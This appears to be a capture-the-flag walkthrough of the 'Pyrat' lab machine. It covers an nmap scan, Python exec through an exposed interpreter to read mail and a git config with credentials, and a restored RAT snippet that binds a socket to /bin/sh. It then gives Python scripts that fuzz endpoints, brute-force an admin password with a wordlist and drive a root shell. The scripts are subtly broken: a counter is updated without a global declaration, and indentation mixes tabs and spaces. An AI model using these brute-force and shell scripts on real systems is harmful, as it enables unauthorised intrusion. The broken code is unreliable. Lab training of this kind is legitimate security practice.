## Introduction
---
> Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.
## Walkthrough
---
First, do a port scan using `nmap`:
```
sudo nmap 10.66.149.28 -oN nmap -sC -sV -v
```
The scan output is displayed below:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-27 03:22 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:22
Completed NSE at 03:22, 0.00s elapsed
Initiating NSE at 03:22
Completed NSE at 03:22, 0.00s elapsed
Initiating NSE at 03:22
Completed NSE at 03:22, 0.00s elapsed
Initiating Ping Scan at 03:22
Scanning 10.66.149.28 [4 ports]
Completed Ping Scan at 03:22, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:22
Completed Parallel DNS resolution of 1 host. at 03:22, 0.50s elapsed
Initiating SYN Stealth Scan at 03:22
Scanning 10.66.149.28 [1000 ports]
Discovered open port 22/tcp on 10.66.149.28
Discovered open port 8000/tcp on 10.66.149.28
Completed SYN Stealth Scan at 03:22, 2.19s elapsed (1000 total ports)
```
I also got a OpenSSH key from nmap scan, displayed below:
```
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 86:c7:1d:9b:c0:f4:75:71:ec:fa:0f:f8:78:0c:14:f1 (RSA)
|   256 41:32:39:9b:40:8b:d9:9f:75:e1:61:30:80:cd:60:0f (ECDSA)
|_  256 86:25:e8:aa:e7:f6:df:26:20:66:16:bb:02:ea:31:e1 (ED25519)
```
When I open the website, it show this:
![image](https://files.catbox.moe/b3sfih.png)
__More basic connection__ leads to `netcat`. Trying to make a connection using `netcat` will respond like this:
![image](https://files.catbox.moe/zpm48v.png)
It's look like a **Python shell environment**. While wondering around, I found an email like this:
```
print(open('/var/mail/think', 'r').read())                                                                                                                                      
From root@pyrat  Thu Jun 15 09:08:55 2023                                                             
Return-Path: <root@pyrat>                                                                             
X-Original-To: think@pyrat                                                                            
Delivered-To: think@pyrat                                                                             
Received: by pyrat.localdomain (Postfix, from userid 0)                                               
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)                                           
Subject: Hello                                                                                        
To: <think@pyrat>                                                                                     
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>
Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen.
```
Also `/opt/dev` contains a `.git` folder, give me a `config` file like below. The credientials are redacted, go find it yourself!
```
print(os.listdir('/opt/dev/.git'))
['objects', 'COMMIT_EDITMSG', 'HEAD', 'description', 'hooks', 'config', 'info', 'logs', 'branches', 'refs', 'index']

print(open('/opt/dev/.git/config', 'r').read())
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = REDACTED
        password = REDACTED
```
Using the credientials in the `config` file, I can open a `ssh` connection to the machine. Now we got a stable machine now.
```
──(kali㉿kali)-[~/Downloads]
└─$ ssh think@10.66.149.28      
The authenticity of host '10.66.149.28 (10.66.149.28)' can't be established.
ED25519 key fingerprint is: SHA256:n43xL5/n6nbM49NPWb5NRtYXA47SQ6u8EodgM6W8zLg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.66.149.28' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
think@10.66.149.28's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 27 Dec 2025 08:47:29 AM UTC

  System load:  0.08              Processes:             113
  Usage of /:   46.7% of 9.75GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for ens5: 10.66.149.28
  Swap usage:   0%

  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

22 updates can be applied immediately.
13 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

You have mail.
Last login: Thu Jun 15 12:09:31 2023 from 192.168.204.1
<redacted>@ip-10-66-149-28:~$
```
Okay, now I'll get the `user` flag, located at `/home/think/user.txt`.
Now, let's begin with the `root` flag. Last time we read a mail, telling that `root` user **ran the RAT program** that `think` uploaded to Github, so maybe the `.git` folder will contains something. Let's check for the `git status`.
```
<redacted>@ip-10-66-149-28:/opt/dev$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
```
You see that? A file got deleted, named `pyrat.py`. Thanksfully that `think` haven't commit it yet, so we can restore it easily. After restore the file, I got `pyrat.py`. Now let's check what's inside.
```
----------------------------------------------------------
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
----------------------------------------------------------
```
Look like the file got a bit messed up, so we cannot read all the file. But this reminds me that, the intro told me that I need to discover a something called "special endpoint". Let's write a Python script to fuzz the endpoint.
```
import socket

def fuzzendpoint(ip, port, endpoints):
    for endpoint in endpoints:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))
            print(f"Testing: {endpoint}")
            client_socket.sendall(endpoint.encode() + b'\n')
            response = client_socket.recv(1024)
            print(f"Response from {endpoint}: {response.decode()}\n")
            client_socket.close()
        except Exception as e:
            print(f"Error with {endpoint}: {e}")

endpoint_list = ["endpoints", "shell", "admin", "backup", "reset", "login", "help", "root", "register", "old", "etc"]

target_ip = "10.66.149.28"
target_port = 8000


fuzzendpoint(target_ip, target_port, endpoint_list)
```
I got 2 endpoints, scanned from the script:
```
Testing: shell
Response from shell: $ 

Testing: admin
Response from admin: Password:
```
I'll skip the `shell` because `$` means this is **a non-priveleged user**. So I need to focus on the `admin` endpoint. I'll fuzz the password like this: Connect to the server and send ‘admin’ -> wait for the ‘password:’ response -> enter the password.

If the password is wrong, nothing happened. So if we get anything other than an empty response, this should be our password. We can automate this using a Python script:
```python
import socket

target_ip = "10.66.149.28"
target_port = 8000
password_wordlist = "rockyou-75.txt"

count = 1

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')
        response = client_socket.recv(1024).decode()
        print(f"respond when send 'admin' endpoint: {response}")

        if "Password:" in response:
            print(f"checking password (tries number {count}): {password}")
            client_socket.sendall(password.encode() + b"\n")
            response = client_socket.recv(1024).decode()
            if response:
                print(f"response for password '{password}' (tries number {count}): {response}")
                return True
            else:
                print(f"password '{password}' (tries number {count}) is incorrect or server died lol")
                count += 1
                return False

    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip() 
        if connect_and_send_password(password):
            print(f"password found: {password}")
            break
        else:
            print(f"password {password} was incorrect (tries number {count}, reconnecting...")

if __name__ == "__main__":
    fuzz_passwords()
```
I'll use the `rockyou-75.txt` password list to check. It didn't takes to long for me to got the password. The respond is described below.
```
response for password ‘<redacted>’ (tries number <redacted>): Welcome Admin!!! Type “shell” to begin.
```
The problem is, I cannot do it manually, so I need to modify the code for a bit.
```python
import socket

target_ip = "10.66.149.28"
target_port = 8000
password = "<redacted>"

def connect_and_interact():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')
        response = client_socket.recv(1024).decode()
        print(f"respond when send 'admin' endpoint: {response}")

        if "Password:" in response:
            client_socket.sendall(password.encode() + b"\n")
            response = client_socket.recv(1024).decode()
            if response:
                print(f"response for password '{password}': {response}")
                print("sent 'shell' command, waiting for shell response...")
				client_socket.sendall(b'shell\n')
                response = client_socket.recv(1024).decode()
                if response:
                    print(f"shell response: {response}")
                    interact_with_shell(client_socket)
            else:
                print(f"error")
				return False
    except Exception as e:
        print(f"error: {e}")
        return False

    finally:
        client_socket.close()

def interact_with_shell(client_socket):
    try:
        while True:
            command = input("execute: ")
            client_socket.sendall(command.encode() + b"\n")
            response = client_socket.recv(4096).decode()
            print(f"output: {response}")

    except Exception as e:
        print(f"error: {e}")

if __name__ == "__main__":
    connect_and_interact()
```
After sending the request, I got the access into the `root` shell. Now I just need to obtain the `root` flag and complete the challenge.